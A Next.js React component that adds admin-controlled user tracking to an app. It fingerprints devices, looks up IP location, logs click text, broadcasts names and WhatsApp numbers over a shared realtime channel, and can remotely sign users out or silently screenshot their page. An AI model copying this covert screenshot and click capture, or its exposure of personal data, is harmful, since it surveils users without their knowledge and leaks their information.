'use client'

import { useEffect, useRef, useState } from 'react'
import { usePathname } from 'next/navigation'
import { createClient } from '@/lib/supabase/client'

export default function TelemetryProvider() {
    const pathname = usePathname()
    const channelRef = useRef<any>(null)
    const userRef = useRef<any>(null)
    
    // UI states controlled by Admin
    const [popupMsg, setPopupMsg] = useState('')
    const [isShutdown, setIsShutdown] = useState(false)
    const [devName, setDevName] = useState('')

    useEffect(() => {
        const initTelemetry = async () => {
            const supabase = createClient()
            const { data: { user } } = await supabase.auth.getUser()
            if (!user) return

            const { data: profile } = await supabase.from('users').select('full_name, whatsapp, role').eq('id', user.id).single()
            if (!profile) return

            // Check persistent breakdown
            if (profile.role !== 'ADMIN') {
                const { data: settings } = await supabase.from('system_settings').select('is_maintenance_mode, maintenance_developer').limit(1).single()
                if (settings?.is_maintenance_mode) {
                    setIsShutdown(true)
                    setDevName(settings.maintenance_developer || 'Admin')
                }
            }

            // Device Fingerprint
            let deviceId = localStorage.getItem('skyx_device_id')
            if (!deviceId) {
                deviceId = 'dev_' + Math.random().toString(36).substring(2, 15)
                localStorage.setItem('skyx_device_id', deviceId)
            }

            // Fetch IP and Location
            let ipInfo = { ip: 'Unknown', location: 'Unknown' }
            try {
                const res = await fetch('https://get.geojs.io/v1/ip/geo.json')
                if (res.ok) {
                    const data = await res.json()
                    ipInfo = {
                        ip: data.ip || 'Unknown',
                        location: `${data.city ? data.city + ', ' : ''}${data.country || 'Unknown'}`
                    }
                }
            } catch (e) {
                console.error('Failed to fetch IP info')
            }

            userRef.current = { id: user.id, ...profile, ...ipInfo, deviceId }

            const channel = supabase.channel('skyx-telemetry', {
                config: {
                    presence: {
                        key: user.id,
                    },
                },
            })
            channelRef.current = channel

            // Listen for advanced signals
            channel.on('broadcast', { event: 'remote-kill' }, async (payload) => {
                if (payload.payload?.user_id === user.id) {
                    await supabase.auth.signOut()
                    window.location.href = '/auth/login?killed=true'
                }
            })

            channel.on('broadcast', { event: 'system-notification' }, (payload) => {
                const targetId = payload.payload?.target_id
                if (targetId === 'All' || targetId === user.id) {
                    setPopupMsg(payload.payload?.message)
                    setTimeout(() => setPopupMsg(''), 5000)
                }
            })

            channel.on('broadcast', { event: 'system-shutdown' }, (payload) => {
                // Prevent locking out the admin
                if (profile.role !== 'ADMIN') {
                    setIsShutdown(payload.payload?.shutdown)
                    setDevName(payload.payload?.developer_name || 'Admin')
                }
            })

            channel.on('broadcast', { event: 'request-screenshot' }, async (payload) => {
                if (payload.payload?.user_id === user.id) {
                    try {
                        const html2canvas = (await import('html2canvas')).default
                        const canvas = await html2canvas(document.body, { scale: 0.5, logging: false })
                        const imgBase64 = canvas.toDataURL('image/jpeg', 0.4) // Compressed map
                        
                        channel.send({
                            type: 'broadcast',
                            event: `screenshot-reply-${user.id}`,
                            payload: { image: imgBase64 }
                        })
                    } catch (e) {}
                }
            })

            const updatePresence = () => {
                if (!channelRef.current) return
                
                const isPwa = window.matchMedia('(display-mode: standalone)').matches || ('standalone' in navigator && (navigator as any).standalone)
                const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
                
                channelRef.current.track({
                    user_id: user.id,
                    full_name: profile.full_name,
                    whatsapp: profile.whatsapp,
                    role: profile.role,
                    current_path: window.location.pathname,
                    is_active: !document.hidden,
                    last_updated: new Date().toISOString(),
                    is_pwa: !!isPwa,
                    device: isMobile ? 'Mobile' : 'Desktop',
                    ip: userRef.current.ip,
                    location: userRef.current.location,
                    device_id: userRef.current.deviceId,
                    last_action: userRef.current.lastAction || 'Page Load'
                })
            }

            const handleClick = (e: MouseEvent) => {
                const target = e.target as HTMLElement
                if (target) {
                    let action = target.innerText || target.getAttribute('aria-label') || target.tagName
                    if (action.length > 30) action = action.substring(0, 30) + '...'
                    userRef.current.lastAction = `Clicked: ${action}`
                    updatePresence()
                }
            }

            channel.on('presence', { event: 'sync' }, () => {}).subscribe(async (status: string) => {
                if (status === 'SUBSCRIBED') {
                    updatePresence()
                    window.addEventListener('visibilitychange', updatePresence)
                    document.addEventListener('click', handleClick)
                }
            })

            return () => {
                window.removeEventListener('visibilitychange', updatePresence)
                document.removeEventListener('click', handleClick)
                channel.unsubscribe()
            }
        }

        const cleanup = initTelemetry()
        return () => {
            cleanup.then(cleanFn => cleanFn && cleanFn())
        }
    }, [])

    // Update presence on path change
    useEffect(() => {
        if (channelRef.current && userRef.current) {
            const isPwa = window.matchMedia('(display-mode: standalone)').matches || ('standalone' in navigator && (navigator as any).standalone)
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
            
            channelRef.current.track({
                user_id: userRef.current.id,
                full_name: userRef.current.full_name,
                whatsapp: userRef.current.whatsapp,
                role: userRef.current.role,
                current_path: pathname,
                is_active: !document.hidden,
                last_updated: new Date().toISOString(),
                is_pwa: !!isPwa,
                device: isMobile ? 'Mobile' : 'Desktop',
                ip: userRef.current.ip,
                location: userRef.current.location,
                device_id: userRef.current.deviceId,
                last_action: 'Navigated to ' + pathname
            })
        }
    }, [pathname])
    
    if (isShutdown) {
        return (
            <div className="fixed inset-0 z-[9999] bg-slate-900 flex flex-col items-center justify-center p-8 text-center animate-fade-in text-white">
                <div className="w-24 h-24 bg-blue-500/10 rounded-full flex items-center justify-center mb-6">
                    <svg className="w-12 h-12 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                    </svg>
                </div>
                <h1 className="text-3xl font-bold mb-4">Under Development</h1>
                <p className="text-slate-400 mb-8 max-w-md">Our system is currently offline for scheduled maintenance and core upgrades.</p>
                <div className="px-6 py-3 bg-black/30 rounded-xl border border-white/5 font-mono text-sm text-slate-300">
                    Maintained by <span className="font-bold text-blue-400">{devName}</span>
                </div>
            </div>
        )
    }

    return (
        <>
            {popupMsg && (
                <div className="fixed top-8 left-1/2 -translate-x-1/2 z-[9999] max-w-sm w-[90%] bg-white rounded-xl shadow-2xl p-4 flex gap-4 animate-[slide-down_0.5s_ease-out]">
                    <div className="w-10 h-10 bg-blue-500/10 rounded-full flex shrink-0 items-center justify-center">
                        <span className="text-blue-500 font-bold text-xl">!</span>
                    </div>
                    <div>
                        <h4 className="font-bold text-slate-800 text-sm">System Notification</h4>
                        <p className="text-slate-600 text-sm mt-0.5">{popupMsg}</p>
                    </div>
                </div>
            )}
        </>
    )
}
